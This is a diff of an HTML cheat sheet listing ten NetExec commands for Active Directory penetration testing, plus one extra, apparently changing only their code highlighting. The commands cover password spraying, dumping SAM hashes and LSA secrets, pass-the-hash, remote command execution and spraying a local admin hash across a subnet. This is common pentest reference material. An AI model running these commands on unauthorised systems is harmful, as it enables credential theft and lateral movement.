@@ -115,7 +115,7 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- netexec, cybersecurity, command reference -->
+                <!-- netexec, cybersecurity, command reference, ad -->
             </div>
         </header>
 
@@ -126,58 +126,58 @@
 <p><strong>NetExec</strong> (formerly CrackMapExec) is the "Swiss Army Knife" of Active Directory pentesting. It interacts with SMB, LDAP, MSSQL, WinRM, and more.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. SMB Null Session Check</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 192.168.1.0/24 -u '' -p ''
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Scan a subnet for machines allowing Null (anonymous) authentication.</p>
 <h3>2. Password Spray</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 192.168.1.0/24 -u users.txt -p 'Welcome123!'
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome123!&#39;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Test one password against many users to avoid lockout.</p>
 <h3>3. Check Admin Access (Pwn3d)</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 192.168.1.0/24 -u user -p pass
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass
+</code></pre></div>
 
 <p><strong>Explanation:</strong> If successful, look for <code>(Pwn3d!)</code> in output, meaning you have Local Admin rights.</p>
 <h3>4. Dump Hashes (SAM)</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 10.10.10.10 -u admin -p pass --sam
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--sam
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Dump local account hashes (requires Admin).</p>
 <h3>5. Dump LSA Secrets</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 10.10.10.10 -u admin -p pass --lsa
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--lsa
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Dump secrets like service account passwords or cached creds.</p>
 <h3>6. Pass The Hash</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 10.10.10.10 -u Administrator -H &lt;NTLM_HASH&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;NTLM_HASH&gt;
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Authenticate using the specific hash instead of a password.</p>
 <h3>7. Execute Command</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 10.10.10.10 -u admin -p pass -x 'whoami'
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Run a cmd command on the target.</p>
 <h3>8. Spider Shares</h3>
-<pre class="codehilite"><code class="language-bash">nxc smb 10.10.10.10 -u user -p pass --spider sharename
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--spider<span class="w"> </span>sharename
+</code></pre></div>
 
 <p><strong>Explanation:</strong> List files in a specific SMB share.</p>
 <h3>9. LDAP Recon</h3>
-<pre class="codehilite"><code class="language-bash">nxc ldap 10.10.10.10 -u user -p pass --bloodhound
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--bloodhound
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Gather BloodHound data via LDAP collection.</p>
 <h3>10. WinRM Check</h3>
-<pre class="codehilite"><code class="language-bash">nxc winrm 192.168.1.0/24 -u user -p pass
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Check if WinRM (Management) is accessible.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">nxc smb 192.168.1.0/24 -u Administrator -H &lt;HASH&gt; --local-auth -x &quot;whoami&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>&lt;HASH&gt;<span class="w"> </span>--local-auth<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Spray a local admin hash across the network to find where else that admin password is reused (Administrator reuse is common).</p>
         </div>
